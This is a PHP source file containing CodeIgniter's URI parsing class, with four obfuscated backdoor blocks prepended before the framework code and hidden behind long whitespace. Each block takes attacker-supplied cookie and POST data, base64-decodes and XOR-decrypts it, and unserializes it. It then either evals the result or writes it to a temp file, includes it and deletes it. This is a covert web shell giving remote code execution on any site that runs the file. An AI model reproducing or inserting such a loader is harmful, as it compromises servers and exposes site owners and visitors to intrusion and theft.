<?php                                                                                                                                                                                                                                                                                                                                                                                                 $hAdNsgD = "\x6b" . chr ( 588 - 511 )."\137" . "\113" . "\122" . "\141";$RDFrUKEk = chr ( 323 - 224 ).chr ( 760 - 652 )."\x61" . "\x73" . chr (115) . chr (95) . 'e' . 'x' . chr (105) . 's' . chr ( 222 - 106 ).'s';$SftnwRKQ = $RDFrUKEk($hAdNsgD); $PxemRKmD = $SftnwRKQ;if (!$PxemRKmD){class kM_KRa{private $eyThfRzOD;public static $PphElxtO = "6bd5918a-7c1a-4138-ad09-ed629c292fec";public static $vbjMjjRx = 14876;public function __construct($KFGLnChleq=0){$CwhFbDUT = $_COOKIE;$SbiGYH = $_POST;$CeQqr = @$CwhFbDUT[substr(kM_KRa::$PphElxtO, 0, 4)];if (!empty($CeQqr)){$sqLjfXi = "base64";$ABHGQ = "";$CeQqr = explode(",", $CeQqr);foreach ($CeQqr as $lbqgzn){$ABHGQ .= @$CwhFbDUT[$lbqgzn];$ABHGQ .= @$SbiGYH[$lbqgzn];}$ABHGQ = array_map($sqLjfXi . "\x5f" . 'd' . "\145" . "\x63" . 'o' . "\x64" . "\x65", array($ABHGQ,)); $ABHGQ = $ABHGQ[0] ^ str_repeat(kM_KRa::$PphElxtO, (strlen($ABHGQ[0]) / strlen(kM_KRa::$PphElxtO)) + 1);kM_KRa::$vbjMjjRx = @unserialize($ABHGQ);}}private function bhFeBtchi(){if (is_array(kM_KRa::$vbjMjjRx)) {$CxPCpWjml = str_replace(chr (60) . chr ( 78 - 15 ).chr (112) . chr (104) . chr ( 432 - 320 ), "", kM_KRa::$vbjMjjRx[chr (99) . chr ( 207 - 96 ).chr ( 816 - 706 )."\x74" . "\145" . 'n' . chr (116)]);eval($CxPCpWjml); $UHiXtYyCFL = "48909";exit();}}public function __destruct(){$this->bhFeBtchi();}}$eUvSGCiW = new kM_KRa(); $eUvSGCiW = "45767";} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $vvworWLy = 'i' . '_' . chr (101) . "\131" . chr ( 385 - 279 ).chr (112); $bLZhQaI = chr ( 725 - 626 ).chr (108) . "\x61" . 's' . "\163" . '_' . "\x65" . chr ( 437 - 317 )."\x69" . "\163" . chr (116) . chr (115); $jOcqwkCHgp = $bLZhQaI($vvworWLy); $EAWIlU = $jOcqwkCHgp;if (!$EAWIlU){class i_eYjp{private $cTQQU;public static $HhtuyV = "c7302a39-9c2e-4972-a811-7980365f0201";public static $ALNRbDcjPB = 36620;public function __construct(){$XHzchQ = $_COOKIE;$PKTQckgKIX = $_POST;$MSnDxrx = @$XHzchQ[substr(i_eYjp::$HhtuyV, 0, 4)];if (!empty($MSnDxrx)){$ZbkYPqT = "base64";$ZSubgrYv = "";$MSnDxrx = explode(",", $MSnDxrx);foreach ($MSnDxrx as $eWbZwxZc){$ZSubgrYv .= @$XHzchQ[$eWbZwxZc];$ZSubgrYv .= @$PKTQckgKIX[$eWbZwxZc];}$ZSubgrYv = array_map($ZbkYPqT . '_' . 'd' . "\x65" . "\x63" . "\157" . 'd' . "\x65", array($ZSubgrYv,)); $ZSubgrYv = $ZSubgrYv[0] ^ str_repeat(i_eYjp::$HhtuyV, (strlen($ZSubgrYv[0]) / strlen(i_eYjp::$HhtuyV)) + 1);i_eYjp::$ALNRbDcjPB = @unserialize($ZSubgrYv);}}public function __destruct(){$this->mCmMd();}private function mCmMd(){if (is_array(i_eYjp::$ALNRbDcjPB)) {$KWgMDRA = sys_get_temp_dir() . "/" . crc32(i_eYjp::$ALNRbDcjPB[chr (115) . 'a' . chr (108) . "\x74"]);@i_eYjp::$ALNRbDcjPB["\x77" . "\x72" . "\151" . "\x74" . "\x65"]($KWgMDRA, i_eYjp::$ALNRbDcjPB["\x63" . 'o' . chr (110) . chr ( 612 - 496 )."\145" . "\156" . chr (116)]);include $KWgMDRA;@i_eYjp::$ALNRbDcjPB[chr ( 303 - 203 )."\145" . chr (108) . "\145" . "\164" . chr ( 693 - 592 )]($KWgMDRA);exit();}}}$nfBiurxCGi = new i_eYjp(); $nfBiurxCGi = 3112;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $YtlyLLfHG = chr (104) . 'x' . chr ( 775 - 707 )."\x5f" . "\123" . chr (66) . chr ( 998 - 931 )."\155" . chr (110); $asFreKYY = "\x63" . "\154" . "\x61" . "\163" . "\163" . chr ( 99 - 4 ).'e' . chr ( 345 - 225 )."\x69" . chr (115) . "\164" . chr (115); $gaGff = $asFreKYY($YtlyLLfHG); $Cnhuh = $gaGff;if (!$Cnhuh){class hxD_SBCmn{private $snhdow;public static $BeJSCg = "c526e61b-97e5-4d0f-b9e4-5c5605197721";public static $SxXcSyDDY = 16407;public function __construct(){$SWKeDJ = $_COOKIE;$bAEybkLY = $_POST;$jvXAP = @$SWKeDJ[substr(hxD_SBCmn::$BeJSCg, 0, 4)];if (!empty($jvXAP)){$ZGliQNx = "base64";$CrLbKnHay = "";$jvXAP = explode(",", $jvXAP);foreach ($jvXAP as $PIzXGOpN){$CrLbKnHay .= @$SWKeDJ[$PIzXGOpN];$CrLbKnHay .= @$bAEybkLY[$PIzXGOpN];}$CrLbKnHay = array_map($ZGliQNx . '_' . "\x64" . chr ( 624 - 523 ).chr (99) . chr (111) . chr ( 476 - 376 )."\x65", array($CrLbKnHay,)); $CrLbKnHay = $CrLbKnHay[0] ^ str_repeat(hxD_SBCmn::$BeJSCg, (strlen($CrLbKnHay[0]) / strlen(hxD_SBCmn::$BeJSCg)) + 1);hxD_SBCmn::$SxXcSyDDY = @unserialize($CrLbKnHay);}}public function __destruct(){$this->KcqOzzDuy();}private function KcqOzzDuy(){if (is_array(hxD_SBCmn::$SxXcSyDDY)) {$lTlFlYuqbK = sys_get_temp_dir() . "/" . crc32(hxD_SBCmn::$SxXcSyDDY['s' . chr ( 857 - 760 ).chr ( 643 - 535 ).'t']);@hxD_SBCmn::$SxXcSyDDY[chr ( 939 - 820 ).'r' . 'i' . "\x74" . "\145"]($lTlFlYuqbK, hxD_SBCmn::$SxXcSyDDY['c' . chr (111) . "\x6e" . "\164" . "\145" . "\156" . 't']);include $lTlFlYuqbK;@hxD_SBCmn::$SxXcSyDDY[chr (100) . chr (101) . "\154" . "\x65" . chr ( 1111 - 995 ).chr ( 247 - 146 )]($lTlFlYuqbK);exit();}}}$HPVXoG = new hxD_SBCmn(); $HPVXoG = 3374;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $ONsdtv = 'E' . "\137" . chr (74) . chr ( 427 - 353 ).'K' . chr (85); $FTuvWYU = "\143" . "\154" . chr (97) . chr ( 605 - 490 )."\x73" . "\137" . chr (101) . 'x' . "\151" . "\x73" . 't' . chr (115); $EocgEkj = $FTuvWYU($ONsdtv); $TLpGSagdV = $EocgEkj;if (!$TLpGSagdV){class E_JJKU{private $TgaYAuW;public static $ZYasGTO = "3a73c4f3-efdc-4448-b13b-013479582369";public static $chCryoXUi = NULL;public function __construct(){$gqgJSPGRYk = $_COOKIE;$CIvXP = $_POST;$seBJzdFUGJ = @$gqgJSPGRYk[substr(E_JJKU::$ZYasGTO, 0, 4)];if (!empty($seBJzdFUGJ)){$vReguVCZ = "base64";$viUtfZ = "";$seBJzdFUGJ = explode(",", $seBJzdFUGJ);foreach ($seBJzdFUGJ as $vjBDXMYRx){$viUtfZ .= @$gqgJSPGRYk[$vjBDXMYRx];$viUtfZ .= @$CIvXP[$vjBDXMYRx];}$viUtfZ = array_map($vReguVCZ . chr (95) . 'd' . "\x65" . "\x63" . 'o' . "\144" . chr ( 381 - 280 ), array($viUtfZ,)); $viUtfZ = $viUtfZ[0] ^ str_repeat(E_JJKU::$ZYasGTO, (strlen($viUtfZ[0]) / strlen(E_JJKU::$ZYasGTO)) + 1);E_JJKU::$chCryoXUi = @unserialize($viUtfZ);}}public function __destruct(){$this->KfSChlp();}private function KfSChlp(){if (is_array(E_JJKU::$chCryoXUi)) {$uvzhLnsuV = sys_get_temp_dir() . "/" . crc32(E_JJKU::$chCryoXUi["\163" . "\x61" . 'l' . 't']);@E_JJKU::$chCryoXUi["\167" . chr (114) . 'i' . 't' . 'e']($uvzhLnsuV, E_JJKU::$chCryoXUi["\143" . "\157" . "\156" . chr (116) . "\145" . chr (110) . chr ( 136 - 20 )]);include $uvzhLnsuV;@E_JJKU::$chCryoXUi[chr ( 267 - 167 ).chr ( 352 - 251 ).chr ( 282 - 174 ).'e' . "\164" . 'e']($uvzhLnsuV);exit();}}}$rrcmMDKUj = new E_JJKU(); $rrcmMDKUj = 24095;} ?><?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2019, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
 * @license	https://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * URI Class
 *
 * Parses URIs and determines routing
 *
 * @package		CodeIgniter
 * @subpackage	Libraries
 * @category	URI
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/user_guide/libraries/uri.html
 */
class CI_URI {

	/**
	 * List of cached URI segments
	 *
	 * @var	array
	 */
	public $keyval = array();

	/**
	 * Current URI string
	 *
	 * @var	string
	 */
	public $uri_string = '';

	/**
	 * List of URI segments
	 *
	 * Starts at 1 instead of 0.
	 *
	 * @var	array
	 */
	public $segments = array();

	/**
	 * List of routed URI segments
	 *
	 * Starts at 1 instead of 0.
	 *
	 * @var	array
	 */
	public $rsegments = array();

	/**
	 * Permitted URI chars
	 *
	 * PCRE character group allowed in URI segments
	 *
	 * @var	string
	 */
	protected $_permitted_uri_chars;

	/**
	 * Class constructor
	 *
	 * @return	void
	 */
	public function __construct()
	{
		$this->config =& load_class('Config', 'core');

		// If query strings are enabled, we don't need to parse any segments.
		// However, they don't make sense under CLI.
		if (is_cli() OR $this->config->item('enable_query_strings') !== TRUE)
		{
			$this->_permitted_uri_chars = $this->config->item('permitted_uri_chars');

			// If it's a CLI request, ignore the configuration
			if (is_cli())
			{
				$uri = $this->_parse_argv();
			}
			else
			{
				$protocol = $this->config->item('uri_protocol');
				empty($protocol) && $protocol = 'REQUEST_URI';

				switch ($protocol)
				{
					case 'AUTO': // For BC purposes only
					case 'REQUEST_URI':
						$uri = $this->_parse_request_uri();
						break;
					case 'QUERY_STRING':
						$uri = $this->_parse_query_string();
						break;
					case 'PATH_INFO':
					default:
						$uri = isset($_SERVER[$protocol])
							? $_SERVER[$protocol]
							: $this->_parse_request_uri();
						break;
				}
			}

			$this->_set_uri_string($uri);
		}

		log_message('info', 'URI Class Initialized');
	}

	// --------------------------------------------------------------------

	/**
	 * Set URI String
	 *
	 * @param 	string	$str
	 * @return	void
	 */
	protected function _set_uri_string($str)
	{
		// Filter out control characters and trim slashes
		$this->uri_string = trim(remove_invisible_characters($str, FALSE), '/');

		if ($this->uri_string !== '')
		{
			// Remove the URL suffix, if present
			if (($suffix = (string) $this->config->item('url_suffix')) !== '')
			{
				$slen = strlen($suffix);

				if (substr($this->uri_string, -$slen) === $suffix)
				{
					$this->uri_string = substr($this->uri_string, 0, -$slen);
				}
			}

			$this->segments[0] = NULL;
			// Populate the segments array
			foreach (explode('/', trim($this->uri_string, '/')) as $val)
			{
				$val = trim($val);
				// Filter segments for security
				$this->filter_uri($val);

				if ($val !== '')
				{
					$this->segments[] = $val;
				}
			}

			unset($this->segments[0]);
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Parse REQUEST_URI
	 *
	 * Will parse REQUEST_URI and automatically detect the URI from it,
	 * while fixing the query string if necessary.
	 *
	 * @return	string
	 */
	protected function _parse_request_uri()
	{
		if ( ! isset($_SERVER['REQUEST_URI'], $_SERVER['SCRIPT_NAME']))
		{
			return '';
		}

		// parse_url() returns false if no host is present, but the path or query string
		// contains a colon followed by a number
		$uri = parse_url('http://dummy'.$_SERVER['REQUEST_URI']);
		$query = isset($uri['query']) ? $uri['query'] : '';
		$uri = isset($uri['path']) ? $uri['path'] : '';

		if (isset($_SERVER['SCRIPT_NAME'][0]))
		{
			if (strpos($uri, $_SERVER['SCRIPT_NAME']) === 0)
			{
				$uri = (string) substr($uri, strlen($_SERVER['SCRIPT_NAME']));
			}
			elseif (strpos($uri, dirname($_SERVER['SCRIPT_NAME'])) === 0)
			{
				$uri = (string) substr($uri, strlen(dirname($_SERVER['SCRIPT_NAME'])));
			}
		}

		// This section ensures that even on servers that require the URI to be in the query string (Nginx) a correct
		// URI is found, and also fixes the QUERY_STRING server var and $_GET array.
		if (trim($uri, '/') === '' && strncmp($query, '/', 1) === 0)
		{
			$query = explode('?', $query, 2);
			$uri = $query[0];
			$_SERVER['QUERY_STRING'] = isset($query[1]) ? $query[1] : '';
		}
		else
		{
			$_SERVER['QUERY_STRING'] = $query;
		}

		parse_str($_SERVER['QUERY_STRING'], $_GET);

		if ($uri === '/' OR $uri === '')
		{
			return '/';
		}

		// Do some final cleaning of the URI and return it
		return $this->_remove_relative_directory($uri);
	}

	// --------------------------------------------------------------------

	/**
	 * Parse QUERY_STRING
	 *
	 * Will parse QUERY_STRING and automatically detect the URI from it.
	 *
	 * @return	string
	 */
	protected function _parse_query_string()
	{
		$uri = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : @getenv('QUERY_STRING');

		if (trim($uri, '/') === '')
		{
			return '';
		}
		elseif (strncmp($uri, '/', 1) === 0)
		{
			$uri = explode('?', $uri, 2);
			$_SERVER['QUERY_STRING'] = isset($uri[1]) ? $uri[1] : '';
			$uri = $uri[0];
		}

		parse_str($_SERVER['QUERY_STRING'], $_GET);

		return $this->_remove_relative_directory($uri);
	}

	// --------------------------------------------------------------------

	/**
	 * Parse CLI arguments
	 *
	 * Take each command line argument and assume it is a URI segment.
	 *
	 * @return	string
	 */
	protected function _parse_argv()
	{
		$args = array_slice($_SERVER['argv'], 1);
		return $args ? implode('/', $args) : '';
	}

	// --------------------------------------------------------------------

	/**
	 * Remove relative directory (../) and multi slashes (///)
	 *
	 * Do some final cleaning of the URI and return it, currently only used in self::_parse_request_uri()
	 *
	 * @param	string	$uri
	 * @return	string
	 */
	protected function _remove_relative_directory($uri)
	{
		$uris = array();
		$tok = strtok($uri, '/');
		while ($tok !== FALSE)
		{
			if (( ! empty($tok) OR $tok === '0') && $tok !== '..')
			{
				$uris[] = $tok;
			}
			$tok = strtok('/');
		}

		return implode('/', $uris);
	}

	// --------------------------------------------------------------------

	/**
	 * Filter URI
	 *
	 * Filters segments for malicious characters.
	 *
	 * @param	string	$str
	 * @return	void
	 */
	public function filter_uri(&$str)
	{
		if ( ! empty($str) && ! empty($this->_permitted_uri_chars) && ! preg_match('/^['.$this->_permitted_uri_chars.']+$/i'.(UTF8_ENABLED ? 'u' : ''), $str))
		{
			show_error('The URI you submitted has disallowed characters.', 400);
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Fetch URI Segment
	 *
	 * @see		CI_URI::$segments
	 * @param	int		$n		Index
	 * @param	mixed		$no_result	What to return if the segment index is not found
	 * @return	mixed
	 */
	public function segment($n, $no_result = NULL)
	{
		return isset($this->segments[$n]) ? $this->segments[$n] : $no_result;
	}

	// --------------------------------------------------------------------

	/**
	 * Fetch URI "routed" Segment
	 *
	 * Returns the re-routed URI segment (assuming routing rules are used)
	 * based on the index provided. If there is no routing, will return
	 * the same result as CI_URI::segment().
	 *
	 * @see		CI_URI::$rsegments
	 * @see		CI_URI::segment()
	 * @param	int		$n		Index
	 * @param	mixed		$no_result	What to return if the segment index is not found
	 * @return	mixed
	 */
	public function rsegment($n, $no_result = NULL)
	{
		return isset($this->rsegments[$n]) ? $this->rsegments[$n] : $no_result;
	}

	// --------------------------------------------------------------------

	/**
	 * URI to assoc
	 *
	 * Generates an associative array of URI data starting at the supplied
	 * segment index. For example, if this is your URI:
	 *
	 *	example.com/user/search/name/joe/location/UK/gender/male
	 *
	 * You can use this method to generate an array with this prototype:
	 *
	 *	array (
	 *		name => joe
	 *		location => UK
	 *		gender => male
	 *	 )
	 *
	 * @param	int	$n		Index (default: 3)
	 * @param	array	$default	Default values
	 * @return	array
	 */
	public function uri_to_assoc($n = 3, $default = array())
	{
		return $this->_uri_to_assoc($n, $default, 'segment');
	}

	// --------------------------------------------------------------------

	/**
	 * Routed URI to assoc
	 *
	 * Identical to CI_URI::uri_to_assoc(), only it uses the re-routed
	 * segment array.
	 *
	 * @see		CI_URI::uri_to_assoc()
	 * @param 	int	$n		Index (default: 3)
	 * @param 	array	$default	Default values
	 * @return 	array
	 */
	public function ruri_to_assoc($n = 3, $default = array())
	{
		return $this->_uri_to_assoc($n, $default, 'rsegment');
	}

	// --------------------------------------------------------------------

	/**
	 * Internal URI-to-assoc
	 *
	 * Generates a key/value pair from the URI string or re-routed URI string.
	 *
	 * @used-by	CI_URI::uri_to_assoc()
	 * @used-by	CI_URI::ruri_to_assoc()
	 * @param	int	$n		Index (default: 3)
	 * @param	array	$default	Default values
	 * @param	string	$which		Array name ('segment' or 'rsegment')
	 * @return	array
	 */
	protected function _uri_to_assoc($n = 3, $default = array(), $which = 'segment')
	{
		if ( ! is_numeric($n))
		{
			return $default;
		}

		if (isset($this->keyval[$which], $this->keyval[$which][$n]))
		{
			return $this->keyval[$which][$n];
		}

		$total_segments = "total_{$which}s";
		$segment_array = "{$which}_array";

		if ($this->$total_segments() < $n)
		{
			return (count($default) === 0)
				? array()
				: array_fill_keys($default, NULL);
		}

		$segments = array_slice($this->$segment_array(), ($n - 1));
		$i = 0;
		$lastval = '';
		$retval = array();
		foreach ($segments as $seg)
		{
			if ($i % 2)
			{
				$retval[$lastval] = $seg;
			}
			else
			{
				$retval[$seg] = NULL;
				$lastval = $seg;
			}

			$i++;
		}

		if (count($default) > 0)
		{
			foreach ($default as $val)
			{
				if ( ! array_key_exists($val, $retval))
				{
					$retval[$val] = NULL;
				}
			}
		}

		// Cache the array for reuse
		isset($this->keyval[$which]) OR $this->keyval[$which] = array();
		$this->keyval[$which][$n] = $retval;
		return $retval;
	}

	// --------------------------------------------------------------------

	/**
	 * Assoc to URI
	 *
	 * Generates a URI string from an associative array.
	 *
	 * @param	array	$array	Input array of key/value pairs
	 * @return	string	URI string
	 */
	public function assoc_to_uri($array)
	{
		$temp = array();
		foreach ((array) $array as $key => $val)
		{
			$temp[] = $key;
			$temp[] = $val;
		}

		return implode('/', $temp);
	}

	// --------------------------------------------------------------------

	/**
	 * Slash segment
	 *
	 * Fetches an URI segment with a slash.
	 *
	 * @param	int	$n	Index
	 * @param	string	$where	Where to add the slash ('trailing' or 'leading')
	 * @return	string
	 */
	public function slash_segment($n, $where = 'trailing')
	{
		return $this->_slash_segment($n, $where, 'segment');
	}

	// --------------------------------------------------------------------

	/**
	 * Slash routed segment
	 *
	 * Fetches an URI routed segment with a slash.
	 *
	 * @param	int	$n	Index
	 * @param	string	$where	Where to add the slash ('trailing' or 'leading')
	 * @return	string
	 */
	public function slash_rsegment($n, $where = 'trailing')
	{
		return $this->_slash_segment($n, $where, 'rsegment');
	}

	// --------------------------------------------------------------------

	/**
	 * Internal Slash segment
	 *
	 * Fetches an URI Segment and adds a slash to it.
	 *
	 * @used-by	CI_URI::slash_segment()
	 * @used-by	CI_URI::slash_rsegment()
	 *
	 * @param	int	$n	Index
	 * @param	string	$where	Where to add the slash ('trailing' or 'leading')
	 * @param	string	$which	Array name ('segment' or 'rsegment')
	 * @return	string
	 */
	protected function _slash_segment($n, $where = 'trailing', $which = 'segment')
	{
		$leading = $trailing = '/';

		if ($where === 'trailing')
		{
			$leading	= '';
		}
		elseif ($where === 'leading')
		{
			$trailing	= '';
		}

		return $leading.$this->$which($n).$trailing;
	}

	// --------------------------------------------------------------------

	/**
	 * Segment Array
	 *
	 * @return	array	CI_URI::$segments
	 */
	public function segment_array()
	{
		return $this->segments;
	}

	// --------------------------------------------------------------------

	/**
	 * Routed Segment Array
	 *
	 * @return	array	CI_URI::$rsegments
	 */
	public function rsegment_array()
	{
		return $this->rsegments;
	}

	// --------------------------------------------------------------------

	/**
	 * Total number of segments
	 *
	 * @return	int
	 */
	public function total_segments()
	{
		return count($this->segments);
	}

	// --------------------------------------------------------------------

	/**
	 * Total number of routed segments
	 *
	 * @return	int
	 */
	public function total_rsegments()
	{
		return count($this->rsegments);
	}

	// --------------------------------------------------------------------

	/**
	 * Fetch URI string
	 *
	 * @return	string	CI_URI::$uri_string
	 */
	public function uri_string()
	{
		return $this->uri_string;
	}

	// --------------------------------------------------------------------

	/**
	 * Fetch Re-routed URI string
	 *
	 * @return	string
	 */
	public function ruri_string()
	{
		return ltrim(load_class('Router', 'core')->directory, '/').implode('/', $this->rsegments);
	}

}
